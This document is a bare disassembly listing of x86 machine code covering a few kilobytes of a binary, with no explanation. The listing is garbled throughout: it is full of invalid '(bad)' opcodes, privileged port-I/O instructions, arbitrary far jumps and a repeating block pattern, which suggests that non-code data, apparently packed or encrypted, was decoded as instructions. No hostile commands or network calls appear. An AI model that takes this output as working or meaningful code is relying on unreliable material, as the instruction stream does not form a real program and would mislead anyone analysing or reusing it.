  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xb85a6b8
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x56000001
  414f8d:	jns    0x414f47
  414f8f:	int    0x88
  414f91:	stc    
  414f92:	sahf   
  414f93:	jae    0x414f91
  414f95:	sbb    cl,BYTE PTR [edx-0x367f437e]
  414f9b:	repnz lds eax,FWORD PTR [ebx]
  414f9e:	xor    eax,0xa25d142b
  414fa3:	in     eax,0x49
  414fa5:	outs   dx,DWORD PTR ds:[esi]
  414fa6:	cld    
  414fa7:	jmp    0x21505e27
  414fac:	mov    cl,0xc0
  414fae:	cmp    bh,bl
  414fb0:	lea    eax,[ebx+0x6a]
  414fb3:	es pusha 
  414fb5:	repnz and DWORD PTR [edx],eax
  414fb8:	adc    al,0x2c
  414fba:	bswap  esp
  414fbc:	js     0x41502a
  414fbe:	push   esi
  414fbf:	fsubr  QWORD PTR [edi+0x71]
  414fc2:	sbb    BYTE PTR [eax-0x2dbbc1d4],bh
  414fc8:	xchg   DWORD PTR [edi-0x68b22893],edx
  414fce:	or     bl,BYTE PTR [esi+0x4f]
  414fd1:	sub    DWORD PTR ds:[ecx-0x622713f0],0x37
  414fd9:	mov    ebx,0x8c4b0386
  414fde:	mov    ebp,0xf26d9697
  414fe3:	ins    DWORD PTR es:[edi],dx
  414fe4:	aaa    
  414fe5:	adc    DWORD PTR [eax+0x72],esp
  414fe8:	push   cs
  414fe9:	loope  0x414fa0
  414feb:	jle    0x41504a
  414fed:	inc    ecx
  414fee:	add    cl,BYTE PTR [ecx+ebp*2]
  414ff1:	nop
  414ff2:	jmp    0x231b:0xb8fa1987
  414ff9:	mov    al,0x3b
  414ffb:	push   0xffffffaf
  414ffd:	cmp    eax,0x9f216b2b
  415002:	pusha  
  415003:	dec    eax
  415004:	es push ss
  415006:	or     eax,0x13031380
  41500b:	jecxz  0x414fe2
  41500d:	add    ah,BYTE PTR [esi-0x6c]
  415010:	iret   
  415011:	inc    ebx
  415012:	jnp    0x415078
  415014:	int    0xb4
  415016:	adc    DWORD PTR [edx-0x52df8b01],edx
  41501c:	out    0x33,eax
  41501e:	add    al,0x8a
  415020:	mov    esi,0x2a362d4
  415025:	in     eax,dx
  415026:	in     eax,0xe3
  415028:	dec    edx
  415029:	jmp    0x7e27:0x2845020a
  415030:	pop    es
  415031:	cmp    BYTE PTR [ebp-0x16],ah
  415034:	sbb    eax,0x17f9448a
  415039:	push   esi
  41503a:	(bad)  
  41503c:	xchg   ebx,eax
  41503d:	xchg   ebx,eax
  41503e:	mov    ebx,DWORD PTR [edx+0xf]
  415041:	jecxz  0x415087
  415043:	xchg   ebp,eax
  415044:	psraw  mm3,QWORD PTR [eax+0xfcfbae4]
  41504b:	(bad)  
  41504c:	jecxz  0x414fd9
  41504e:	sub    dh,dh
  415050:	dec    esp
  415051:	mov    edx,0xb68e4780
  415056:	outs   dx,DWORD PTR ds:[esi]
  415057:	lock inc ebx
  415059:	mov    ah,0x14
  41505b:	sub    dl,BYTE PTR [eax]
  41505d:	fmul   QWORD PTR [ecx+0x26de5a08]
  415063:	jae    0x415093
  415065:	je     0x41505e
  415067:	scas   al,BYTE PTR es:[edi]
  415068:	and    eax,0x8991dd53
  41506e:	mov    WORD PTR [ecx],?
  415070:	pusha  
  415071:	xor    DWORD PTR ds:0xd61bc6d1,eax
  415077:	pop    esi
  415078:	loop   0x4150ca
  41507a:	aam    0xc2
  41507c:	ret    
  41507d:	push   edi
  41507e:	xor    ebx,ebx
  415080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415081:	pop    ebx
  415082:	xchg   ecx,eax
  415083:	outs   dx,BYTE PTR ds:[esi]
  415084:	aam    0xb1
  415086:	mov    WORD PTR [eax-0x45baf1d3],gs
  41508c:	mov    ds:0x35359f3a,al
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xcc9dfc2d
  415102:	lods   al,BYTE PTR cs:[esi]
  415104:	sbb    dh,bl
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0xd7000001
  41510d:	out    dx,eax
  41510e:	(bad)  
  41510f:	sahf   
  415110:	cld    
  415111:	xchg   BYTE PTR [eax+0x28],al
  415114:	ins    DWORD PTR es:[edi],dx
  415115:	(bad)  
  415116:	pop    ebp
  415117:	mov    esp,0x5a877119
  41511c:	sbb    al,0x8a
  41511e:	fbstp  TBYTE PTR [esi]
  415120:	rcl    BYTE PTR [edx+edi*1+0xd],cl
  415124:	push   0x28
  415126:	shr    ecx,0xb9
  415129:	call   0xfae4:0x70d9b138
  415130:	imul   ebp,DWORD PTR [ebx],0xffffffb2
  415133:	nop
  415134:	or     eax,0xaaa2d459
  415139:	je     0x415168
  41513b:	sbb    eax,0xa2319696
  415140:	fistp  WORD PTR [edx-0x26]
  415143:	in     eax,dx
  415144:	push   esp
  415145:	aaa    
  415146:	cmp    DWORD PTR [esi],ebp
  415148:	or     BYTE PTR [esi],bl
  41514a:	mov    WORD PTR [edx-0x4b],?
  41514d:	aaa    
  41514e:	adc    eax,0x4abad36f
  415153:	sub    DWORD PTR [edi-0x4a0243ec],eax
  415159:	nop
  41515a:	add    BYTE PTR [esi+0x2e],dh
  41515d:	xor    ch,ah
  41515f:	pop    ebp
  415160:	mov    ebp,0x789d300f
  415165:	test   ch,ch
  415167:	dec    ebx
  415168:	mov    bl,0xf1
  41516a:	retf   0xccf6
  41516d:	cmp    al,0x26
  41516f:	das    
  415170:	fcom   DWORD PTR [ecx-0x13]
  415173:	js     0x41518d
  415175:	xor    DWORD PTR [edx],esi
  415177:	mov    al,ds:0x445fc758
  41517c:	jno    0x415148
  41517e:	sub    BYTE PTR [edx-0x7e],dl
  415181:	in     eax,0xcc
  415183:	xchg   ecx,eax
  415184:	es cwde 
  415186:	sbb    esp,DWORD PTR [ebp+ebp*1+0x40]
  41518a:	fnsave [ecx+ebx*1-0xa0df007]
  415191:	jbe    0x415192
  415193:	fisub  DWORD PTR [esi-0xe]
  415196:	mov    ch,0x20
  415198:	mov    bh,0xcf
  41519a:	ins    BYTE PTR es:[edi],dx
  41519b:	sub    ah,BYTE PTR ds:0x87252753
  4151a1:	(bad)  
  4151a2:	and    al,0xd4
  4151a4:	pop    edx
  4151a5:	cmp    ch,BYTE PTR [esi-0x48]
  4151a8:	ret    0xfdfc
  4151ab:	fs aaa 
  4151ad:	push   es
  4151ae:	lds    cx,DWORD PTR [ebp+edi*1-0x2ed4b3c0]
  4151b6:	fs dec eax
  4151b8:	scas   eax,DWORD PTR es:[edi]
  4151b9:	mov    WORD PTR [edi],es
  4151bb:	cli    
  4151bc:	jp     0x41519c
  4151be:	inc    ecx
  4151bf:	jo     0x415183
  4151c1:	pop    edi
  4151c2:	push   0x5
  4151c4:	sar    BYTE PTR ds:0x7c41,cl
  4151c9:	jge    0x4151d7
  4151cb:	test   cl,0x5
  4151ce:	add    eax,esp
  4151d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151d1:	mov    WORD PTR [esi-0x1c],?
  4151d4:	loopne 0x415176
  4151d6:	(bad)  
  4151d7:	sub    al,0x3a
  4151d9:	sub    esi,DWORD PTR [ebx]
  4151db:	test   edx,0xa36cccfd
  4151e1:	in     al,dx
  4151e2:	iret   
  4151e3:	pop    edi
  4151e4:	jbe    0x4151d9
  4151e6:	test   DWORD PTR [esi-0x5ee9e984],esp
  4151ec:	fldcw  WORD PTR [eax-0x3e]
  4151ef:	mov    ah,0xb1
  4151f1:	aad    0x75
  4151f3:	push   cs
  4151f4:	push   ds
  4151f5:	jecxz  0x4151f2
  4151f7:	sbb    edx,ebx
  4151f9:	int    0x9e
  4151fb:	mov    dh,0x5b
  4151fd:	xor    edx,ebx
  4151ff:	icebp  
  415200:	js     0x415256
  415202:	std    
  415203:	and    BYTE PTR ss:[ebp+edi*1-0x63d38fed],al
  41520b:	popa   
  41520c:	(bad)  
  41520e:	mov    ah,0x5c
  415210:	jbe    0x415212
	...
  415272:	add    BYTE PTR [eax],al
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xfef2900b
  415283:	int    0x1d
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR ds:0x2c000001,al
  41528d:	(bad)  
  41528e:	ins    BYTE PTR es:[edi],dx
  41528f:	xor    dh,BYTE PTR [ebx]
  415291:	inc    ecx
  415292:	push   ss
  415293:	inc    DWORD PTR [ebp+0x963e975]
  415299:	sbb    BYTE PTR [edi],bh
  41529b:	lock aam 0x6b
  41529e:	mov    ebx,0x7c0d33e1
  4152a3:	xor    dh,BYTE PTR [ebp+0x3c]
  4152a6:	stos   DWORD PTR es:[edi],eax
  4152a7:	xchg   DWORD PTR [ecx+0x17f1c56],ecx
  4152ad:	push   ebx
  4152ae:	push   ebp
  4152af:	retf   0x840c
  4152b2:	cmp    BYTE PTR [ebp+0x12],0xa5
  4152b6:	sub    bl,BYTE PTR [ebx]
  4152b8:	rcl    BYTE PTR [esi-0x2d],cl
  4152bb:	fucomip st,st(6)
  4152bd:	das    
  4152be:	sub    BYTE PTR ds:0xe617b0e8,bh
  4152c4:	cdq    
  4152c5:	out    dx,eax
  4152c6:	fsub   st(7),st
  4152c8:	jnp    0x41533a
  4152ca:	and    al,0xa9
  4152cc:	mov    al,0x27
  4152ce:	cmp    BYTE PTR [esi],dh
  4152d0:	xchg   DWORD PTR [ebp+0x7d7fbf2c],ecx
  4152d6:	ins    DWORD PTR es:[edi],dx
  4152d7:	bound  esp,QWORD PTR [esi-0x36]
  4152da:	adc    BYTE PTR [edx],cl
  4152dc:	sti    
  4152dd:	and    ebp,esp
  4152df:	sub    BYTE PTR [esi-0x44],0xd4
  4152e3:	mov    edx,edx
  4152e5:	cld    
  4152e6:	fs call 0x74c5:0xc267114b
  4152ee:	sar    BYTE PTR [edx-0x13608969],cl
  4152f4:	xchg   edx,eax
  4152f5:	mov    edx,0x24e45a15
  4152fa:	pop    edi
  4152fb:	cmp    al,0x8d
  4152fd:	mov    eax,0x84385087
  415302:	imul   DWORD PTR [ebx]
  415304:	das    
  415305:	adc    DWORD PTR [ebp+0x65f5d07b],esi
  41530b:	sub    al,0x58
  41530d:	mov    ds:0x292e6b2d,al
  415312:	test   eax,0x1bea0513
  415317:	xchg   edi,eax
  415318:	ror    BYTE PTR [ecx],cl
  41531a:	mov    bl,0x23
  41531c:	mov    al,ds:0x7b87738e
  415321:	dec    edx
  415322:	repz leave 
  415324:	in     al,0x66
  415326:	mov    ebp,0x5169c885
  41532b:	shl    DWORD PTR ds:0xe623172f,0x41
  415332:	enter  0x3e2d,0xf5
  415336:	das    
  415337:	in     eax,0x44
  415339:	das    
  41533a:	inc    ebx
  41533b:	dec    ebp
  41533c:	stc    
  41533d:	jge    0x41536a
  41533f:	mov    dl,0x81
  415341:	mov    esi,0xb0428482
  415346:	scas   eax,DWORD PTR es:[edi]
  415347:	jg     0x4153ab
  415349:	mov    esp,0xcf5674cd
  41534e:	mov    BYTE PTR [ebx],bh
  415350:	jne    0x415371
  415352:	xlat   BYTE PTR ds:[ebx]
  415353:	cmp    WORD PTR [edx+0x6127d39f],di
  41535a:	imul   esi,DWORD PTR ds:0x41a763c4,0x9552a7b5
  415364:	das    
  415365:	jecxz  0x4153a9
  415367:	mov    ds:0x5dea170b,eax
  41536c:	mov    al,ds:0xf695f9c1
  415371:	cmc    
  415372:	jl     0x41530d
  415374:	push   ss
  415375:	pop    edi
  415376:	inc    esp
  415377:	(bad)  
  415378:	mov    dh,0x58
  41537a:	sbb    esi,DWORD PTR fs:[ebp-0x49]
  41537e:	test   eax,0x1544e3e6
  415383:	push   0xacdba2ec
  415388:	mov    ebx,0xdc2141f2
  41538d:	fld    TBYTE PTR [ebx-0x65]
  415390:	push   ebp
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x43d3e5b0
  415401:	push   eax
  415402:	cli    
  415403:	mov    ds:0xe022,eax
  415408:	add    eax,0x14000001
  41540d:	inc    esp
  41540e:	test   eax,0x686ee371
  415413:	sbb    BYTE PTR [edx],ch
  415415:	or     BYTE PTR [esi],dh
  415417:	xor    al,0xd8
  415419:	mov    ch,BYTE PTR [ecx]
  41541b:	lods   al,BYTE PTR ds:[esi]
  41541c:	mov    dl,0x6f
  41541e:	cdq    
  41541f:	dec    edi
  415420:	mov    ch,0xbc
  415422:	stos   DWORD PTR es:[edi],eax
  415423:	jns    0x415404
  415425:	aaa    
  415426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415427:	push   ebx
  415428:	lock popa 
  41542a:	fdivr  st(0),st
  41542c:	and    al,0x40
  41542e:	or     eax,0x43196373
  415433:	push   0x102949ed
  415438:	inc    esp
  415439:	pop    es
  41543a:	cdq    
  41543b:	mov    dl,0x2a
  41543d:	or     ecx,DWORD PTR [edi-0x36d089cc]
  415443:	test   BYTE PTR ds:0x27d54f8c,bh
  415449:	je     0x4153e6
  41544b:	jmp    0x41547a
  41544d:	sbb    DWORD PTR [edx+0x4f66f52e],0xcf271a79
  415457:	adc    eax,0x2437a283
  41545c:	pop    eax
  41545d:	jmp    0x4f0cd5dc
  415462:	sti    
  415463:	ds cmp al,0x62
  415466:	test   eax,0xfb535d9
  41546b:	outs   dx,DWORD PTR ds:[esi]
  41546c:	fs push esi
  41546e:	jl     0x4154cf
  415470:	ins    DWORD PTR es:[edi],dx
  415471:	rsqrtps xmm6,XMMWORD PTR [ebp+0x1655e810]
  415478:	cwde   
  415479:	mov    edi,0x26213abd
  41547e:	outs   dx,DWORD PTR ds:[esi]
  41547f:	add    DWORD PTR [esi],ebx
  415481:	pusha  
  415482:	mov    esi,0x4a59bbe
  415487:	push   edi
  415488:	popf   
  415489:	pop    ss
  41548a:	js     0x41546f
  41548c:	mov    bh,0xea
  41548e:	push   esp
  41548f:	push   0xf1c512d8
  415494:	xor    ebx,DWORD PTR [ebp+0x6c]
  415497:	(bad)  
  415498:	pop    edx
  415499:	ss adc eax,0x878f5754
  41549f:	mov    bh,0x52
  4154a1:	pop    ecx
  4154a2:	inc    esi
  4154a3:	addr16 push esp
  4154a5:	neg    ecx
  4154a7:	jb     0x4154ba
  4154a9:	and    DWORD PTR [ebx-0x6d],esi
  4154ac:	mov    al,ds:0xdd759a01
  4154b1:	pop    edi
  4154b2:	xchg   esi,eax
  4154b3:	mov    eax,ds:0x334dcfd7
  4154b8:	aam    0x47
  4154ba:	dec    esp
  4154bb:	and    edx,ebp
  4154bd:	jmp    0x50d593c2
  4154c2:	scas   al,BYTE PTR es:[edi]
  4154c3:	xor    edi,ecx
  4154c5:	and    eax,0x4a96b9f6
  4154ca:	xor    al,0x79
  4154cc:	jns    0x41546a
  4154ce:	fldcw  WORD PTR [edi-0x72f92d31]
  4154d4:	dec    ebx
  4154d5:	push   esi
  4154d6:	or     BYTE PTR [esi],bh
  4154d8:	out    dx,eax
  4154d9:	inc    edx
  4154da:	stc    
  4154db:	adc    ecx,DWORD PTR ds:0xd23d83e8
  4154e1:	cs jecxz 0x4154b6
  4154e4:	xchg   ebx,eax
  4154e5:	cdq    
  4154e6:	retf   
  4154e7:	scas   al,BYTE PTR es:[edi]
  4154e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154e9:	xor    DWORD PTR [edi-0x3c12db3d],edi
  4154ef:	jge    0x41554e
  4154f1:	sub    BYTE PTR [edx],al
  4154f3:	xchg   ecx,eax
  4154f4:	jmp    0x41552c
  4154f6:	je     0x41550b
  4154f8:	inc    ebp
  4154f9:	mov    eax,ebx
  4154fb:	out    0x95,eax
  4154fd:	cdq    
  4154fe:	rcr    DWORD PTR [ecx-0x69],cl
  415501:	pop    ebp
  415502:	sub    BYTE PTR ds:0x719b91a5,ch
  415508:	dec    ebp
  415509:	loope  0x415539
  41550b:	rcr    cl,1
  41550d:	sbb    ch,dh
  41550f:	loope  0x41558c
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x41557d
  415581:	mov    ds:0xe1270f3a,eax
  415586:	add    BYTE PTR [eax],al
  415588:	add    eax,0x44000001
  41558d:	add    eax,0x395a55a2
  415592:	in     al,0xd2
  415594:	scas   al,BYTE PTR es:[edi]
  415595:	add    al,0x6f
  415597:	sub    BYTE PTR [eax],bh
  415599:	and    ebp,DWORD PTR [edx-0x4c]
  41559c:	sub    ebp,DWORD PTR [edi+0x37513e61]
  4155a2:	dec    ebx
  4155a3:	pop    esp
  4155a4:	xchg   edi,eax
  4155a5:	pop    ebp
  4155a6:	push   ebx
  4155a7:	in     al,dx
  4155a8:	pop    ss
  4155a9:	or     DWORD PTR [ecx-0x470ac41a],ecx
  4155af:	xor    ebp,eax
  4155b1:	adc    DWORD PTR [ecx],ecx
  4155b3:	fs jmp 0xcddba615
  4155b9:	xchg   esp,eax
  4155ba:	sub    bl,BYTE PTR [edi-0x21]
  4155bd:	fcomp  DWORD PTR [esi+ecx*2]
  4155c0:	cmp    eax,0x29bd0ea2
  4155c5:	xlat   BYTE PTR ds:[ebx]
  4155c6:	xchg   ebp,eax
  4155c7:	push   cs
  4155c8:	(bad)  
  4155c9:	mov    dh,0x4b
  4155cb:	pop    edi
  4155cc:	gs mov al,al
  4155cf:	into   
  4155d0:	dec    edx
  4155d1:	adc    eax,DWORD PTR [ebx-0x544093d3]
  4155d7:	push   ss
  4155d8:	and    al,0x6f
  4155da:	and    DWORD PTR [ebx+0x726a6058],ebp
  4155e0:	into   
  4155e1:	out    dx,eax
  4155e2:	cmp    DWORD PTR [edx+0x72],esp
  4155e5:	(bad)  [eax]
  4155e7:	pop    edi
  4155e8:	adc    al,0x63
  4155ea:	push   ebp
  4155eb:	mov    esp,DWORD PTR [edi-0x4e12cb5a]
  4155f1:	mov    ebp,DWORD PTR [ecx+0x318241c1]
  4155f7:	inc    esi
  4155f8:	inc    esp
  4155f9:	leave  
  4155fa:	int3   
  4155fb:	xor    eax,0x6e59446f
  415600:	mov    al,0xdc
  415602:	dec    ebp
  415603:	ss in  eax,dx
  415605:	xchg   esp,eax
  415606:	pop    ss
  415607:	add    eax,edx
  415609:	cs cmp ebp,edi
  41560c:	and    BYTE PTR [esi],bl
  41560e:	call   0x77614eb7
  415613:	jl     0x4155a9
  415615:	mov    ebp,?
  415617:	jg     0x4155e0
  415619:	jle    0x415654
  41561b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41561c:	sub    al,BYTE PTR ds:0x79e27424
  415622:	cmp    BYTE PTR [esi+0x75],ah
  415625:	cdq    
  415626:	push   ebx
  415627:	push   ds
  415628:	loope  0x415614
  41562a:	add    al,0x38
  41562c:	xchg   DWORD PTR [eax],edi
  41562e:	shl    DWORD PTR [ebp-0x2],cl
  415631:	dec    ecx
  415632:	into   
  415633:	xor    edi,0x3a3dc0e6
  415639:	pop    ds
  41563a:	stc    
  41563b:	cmp    ch,BYTE PTR [ecx+0x285809f3]
  415641:	call   0xbe56:0x8f73d535
  415648:	fxch   st(3)
  41564a:	sbb    BYTE PTR [edi-0x36],ah
  41564d:	js     0x41560a
  41564f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415650:	repz push ds
  415652:	call   DWORD PTR [edx]
  415654:	pop    ss
  415655:	pop    edx
  415656:	xor    DWORD PTR [ebp+0x35],0x55
  41565a:	pusha  
  41565b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41565d:	mov    cl,0xdd
  41565f:	ds aas 
  415661:	push   esi
  415662:	das    
  415663:	cmp    ecx,DWORD PTR [esi]
  415665:	in     eax,0xaa
  415667:	xchg   edx,eax
  415668:	lock je 0x41563c
  41566b:	ror    BYTE PTR [ebp+0x6c010970],cl
  415671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415672:	test   al,0xaa
  415674:	cs pop esp
  415676:	sbb    edx,DWORD PTR [edx+0x335349ef]
  41567c:	jecxz  0x41563a
  41567e:	dec    esp
  41567f:	das    
  415680:	mov    ch,BYTE PTR [ebx+0x7d]
  415683:	(bad)  
  415684:	into   
  415685:	xchg   ebx,eax
  415686:	push   es
  415687:	adc    DWORD PTR [edx+0x5fd2a3e2],ecx
  41568d:	or     DWORD PTR [edi+0x28],ebx
  415690:	cmp    BYTE PTR [eax],al
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xe4
  415701:	or     BYTE PTR [esi+0x5d],ah
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0xca000001
  41570d:	xor    eax,DWORD PTR [ebx]
  41570f:	icebp  
  415710:	out    dx,eax
  415711:	int3   
  415712:	pushf  
  415713:	ja     0x4156c9
  415715:	dec    eax
  415716:	jmp    0xe211cb26
  41571b:	out    dx,al
  41571c:	test   al,0x2a
  41571e:	pushf  
  41571f:	and    DWORD PTR [ebp+0x4d968002],esp
  415725:	jmp    0xad4a:0x12fa33d3
  41572c:	jmp    0x9d02:0xc0145eee
  415733:	imul   esi,ebx,0xffffff94
  415736:	cs aad 0xe0
  415739:	add    ebp,0x220f8032
  41573f:	sub    esi,DWORD PTR [ebp+0x733c8daf]
  415745:	neg    DWORD PTR [ecx+0xe79019e]
  41574b:	cmp    ecx,DWORD PTR [ebp-0x4a]
  41574e:	or     al,0x90
  415750:	xchg   esp,eax
  415751:	jmp    0x415702
  415753:	mov    cl,0xfa
  415755:	mov    ebx,0x2898bc11
  41575a:	ret    0x8f2c
  41575d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41575e:	dec    esp
  41575f:	sbb    ah,BYTE PTR [esi]
  415761:	push   0xb5518c9d
  415766:	loopne 0x415706
  415768:	out    0x6b,eax
  41576a:	int3   
  41576b:	inc    esi
  41576c:	aam    0xcb
  41576e:	aad    0x98
  415770:	sbb    ecx,DWORD PTR [eax+0x7c]
  415773:	push   esp
  415774:	push   ss
  415775:	jp     0x415713
  415777:	xchg   ecx,eax
  415778:	pop    ecx
  415779:	retf   0x756b
  41577c:	fadd   QWORD PTR [esi]
  41577e:	xchg   ebp,eax
  41577f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415780:	or     cl,bl
  415782:	cmp    ah,BYTE PTR [esi+0x3cea8cc1]
  415788:	outs   dx,BYTE PTR ds:[esi]
  415789:	in     eax,dx
  41578a:	ins    BYTE PTR es:[edi],dx
  41578b:	(bad)  
  41578c:	int    0xe
  41578e:	mov    ebx,0xd9139c9b
  415793:	and    esp,DWORD PTR [ebx]
  415795:	hlt    
  415796:	xor    BYTE PTR [ebx-0x55fe3e85],ch
  41579c:	mov    gs,WORD PTR [edi+0x78016ed2]
  4157a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157a3:	sar    DWORD PTR [esi-0x4d89105d],0xf7
  4157aa:	mov    eax,eax
  4157ac:	add    al,0x54
  4157ae:	fmulp  st(7),st
  4157b0:	aaa    
  4157b1:	test   eax,0xf4422854
  4157b7:	or     eax,0xc7458c4f
  4157bc:	adc    al,0x86
  4157be:	adc    eax,0xc1e9582
  4157c3:	(bad)  
  4157c4:	xor    BYTE PTR [ecx-0x20b94f24],cl
  4157ca:	mov    edi,0x600b2e0b
  4157cf:	popf   
  4157d0:	xor    eax,0x16427bd9
  4157d5:	xchg   ebp,eax
  4157d6:	mov    bh,0x32
  4157d8:	shl    DWORD PTR [bp-0xd],1
  4157dc:	and    BYTE PTR [ebx],0xfd
  4157df:	push   esp
  4157e0:	xchg   BYTE PTR [ecx],ch
  4157e2:	std    
  4157e3:	scas   al,BYTE PTR es:[edi]
  4157e4:	retf   0x2128
  4157e7:	stos   BYTE PTR es:[edi],al
  4157e8:	adc    eax,0xb453ba06
  4157ed:	mov    bh,0xd8
  4157ef:	push   ebx
  4157f0:	sub    DWORD PTR [edx-0x4],esi
  4157f3:	dec    edi
  4157f4:	dec    edx
  4157f5:	iret   
  4157f6:	imul   ebp,DWORD PTR [esi-0x5],0xffffffc2
  4157fa:	stos   DWORD PTR es:[edi],eax
  4157fb:	cli    
  4157fc:	fcomp  st(4)
  4157fe:	lods   eax,DWORD PTR ds:[esi]
  4157ff:	sar    BYTE PTR [esi+0x37],1
  415802:	push   eax
  415803:	xlat   BYTE PTR ds:[ebx]
  415804:	push   0xffffff87
  415806:	or     eax,0xfcc5c70f
  41580b:	jmp    0xa7:0xe48b2a99
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	ror    ebp,cl
  415881:	mov    DWORD PTR [esi+0xe331c0],eax
  415887:	add    BYTE PTR ds:0x83000001,al
  41588d:	mov    cs,WORD PTR [edx-0x2]
  415890:	pop    esi
  415891:	dec    ebx
  415892:	ins    BYTE PTR es:[edi],dx
  415893:	jne    0x415845
  415895:	push   0x1c
  415897:	jbe    0x415838
  415899:	xchg   ebx,eax
  41589a:	sub    al,BYTE PTR [esi+0x53ed33b0]
  4158a0:	popa   
  4158a1:	js     0x415856
  4158a3:	xor    DWORD PTR [eax+0x39f93451],ecx
  4158a9:	in     eax,0xff
  4158ab:	scas   eax,DWORD PTR es:[edi]
  4158ac:	sub    eax,0x411ab9e1
  4158b1:	pop    ecx
  4158b2:	stos   BYTE PTR es:[edi],al
  4158b3:	add    BYTE PTR [ecx-0x41],al
  4158b6:	imul   ebx,DWORD PTR [esi],0xffffff93
  4158b9:	cli    
  4158ba:	int3   
  4158bb:	mov    ds:0xb0ce3393,eax
  4158c0:	cmp    ecx,DWORD PTR [ecx+0xf019198]
  4158c6:	das    
  4158c7:	and    ebx,eax
  4158c9:	mov    cl,0xf5
  4158cb:	shl    ecx,1
  4158cd:	(bad)  
  4158ce:	bnd jmp 0x4158b7
  4158d1:	cmc    
  4158d2:	enter  0xc9cb,0x9c
  4158d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d7:	dec    edi
  4158d8:	(bad)  
  4158d9:	rol    BYTE PTR [ebx],1
  4158db:	fisubr DWORD PTR [edx]
  4158dd:	rcr    DWORD PTR [eax-0x58],cl
  4158e0:	adc    ah,BYTE PTR ds:0x45fda84c
  4158e6:	pop    ds
  4158e7:	pop    ecx
  4158e8:	std    
  4158e9:	push   ecx
  4158ea:	push   esi
  4158eb:	fucomip st,st(0)
  4158ed:	stos   BYTE PTR es:[edi],al
  4158ee:	mov    gs,WORD PTR [ecx-0x28]
  4158f1:	add    BYTE PTR [ecx-0x667fbd5d],ah
  4158f7:	jb     0x41594c
  4158f9:	test   BYTE PTR ds:0x45a51ea1,dh
  4158ff:	aas    
  415900:	sbb    BYTE PTR [eax+0x66],dh
  415903:	sbb    DWORD PTR [edi],ebp
  415905:	sbb    al,BYTE PTR [eax+0x1e9106c2]
  41590b:	jl     0x4158ad
  41590d:	ins    BYTE PTR es:[edi],dx
  41590e:	(bad)  
  41590f:	es stos BYTE PTR es:[edi],al
  415911:	imul   edx,DWORD PTR [edx+0x7c],0xd68765d8
  415918:	out    0xc6,al
  41591a:	in     al,0x34
  41591c:	pop    ebp
  41591d:	mov    edi,cr0
  415920:	adc    edi,DWORD PTR [ecx]
  415922:	mov    al,0x9b
  415924:	and    al,0x72
  415926:	test   BYTE PTR [ebx-0x6c],cl
  415929:	(bad)
  41592c:	inc    esp
  41592d:	or     eax,0x5c892824
  415932:	test   DWORD PTR [ebx-0x57],0x1a4c01ad
  415939:	or     al,0x2a
  41593b:	adc    BYTE PTR [ecx-0x7],dh
  41593e:	pop    ds
  41593f:	out    0x84,al
  415941:	mov    edi,0xb15cb720
  415946:	fldenv [eax-0x25]
  415949:	jl     0x415999
  41594b:	iret   
  41594c:	(bad)  
  41594d:	in     eax,0xf8
  41594f:	jbe    0x41591c
  415951:	mov    ecx,0x157fa219
  415956:	jno    0x4159b8
  415958:	xchg   ebp,eax
  415959:	xchg   ebx,eax
  41595a:	dec    eax
  41595b:	inc    eax
  41595c:	xlat   BYTE PTR ds:[ebx]
  41595d:	add    bl,BYTE PTR [ecx+0x5f]
  415960:	mov    dh,0x7f
  415962:	std    
  415963:	mov    dh,0x20
  415965:	ficomp WORD PTR [edi-0x58867de1]
  41596b:	or     al,0x54
  41596d:	mov    BYTE PTR [edi+ebp*4+0x78a9be00],bl
  415974:	cmp    ah,BYTE PTR [eax-0x65]
  415977:	imul   esp,DWORD PTR [edi+0x35],0x78d521a6
  41597e:	mov    esp,0xde1e783d
  415983:	mov    ecx,0xe58e954c
  415988:	test   eax,0x1bf05baa
  41598d:	stos   DWORD PTR es:[edi],eax
  41598e:	rol    BYTE PTR [ebx+eiz*2],cl
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
